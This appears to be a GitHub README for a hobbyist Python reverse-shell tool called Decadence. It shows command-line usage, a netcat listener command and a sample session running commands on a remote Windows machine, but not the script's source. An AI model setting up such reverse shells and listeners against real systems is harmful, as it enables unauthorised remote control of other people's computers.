# Decadence - Python Reverse Shell

So this was one of my earllyyy projects when I was first learning python. 

I decided to come back and fix it up a little bit. 


Essentially, the name says it all. It is a python reverse shell script. 

I've focused this one on providing the functionality client-side. Nothing special yet, just 'cd' but its a good example of what you could implement.  


## Usage

- Step 1 - Set up a listener
- Step 2 - Be silly enough to run this 
- Step 3 - Run it


### Client Side

Simple, pass the arguments! 

```

usage: decadence.py [-h] --host HOST --port PORT
decadence.py: error: the following arguments are required: --host, --port

PS D:\GitHub\decadence> py .\decadence.py --host 127.0.0.1 --port 223

```

I've only tested this with netcat as the listener. 

### Server Side

```
root@#######:~# nc -nvlp 223
Listening on [0.0.0.0] (family 0, port 223)
Connection from xx.xx.xx.xx 52877 received!

connected!   

user account:
desktop\pitticus

decadence> 

```

### Crazy built-in functionality?! 

- cd - That's right, you can change directory
- help - Incase you forget you can change directory
- exit - Because we all want to quit sometimes

```
decadence> cd C:\temp

decadence> dir
 Volume in drive C is Blade SSD
 Volume Serial Number is E02A-5775

 Directory of C:\temp

02/06/2020  08:26 PM    <DIR>          .     
02/06/2020  08:26 PM    <DIR>          ..    
               0 File(s)              0 bytes
               2 Dir(s)  169,325,039,616 bytes free

decadence>

```

```
decadence> help

        built-in support
--------------------------------
cd - change directory
exit - closes the connection

```

```
decadence> exit
root@vultr:~# 

```

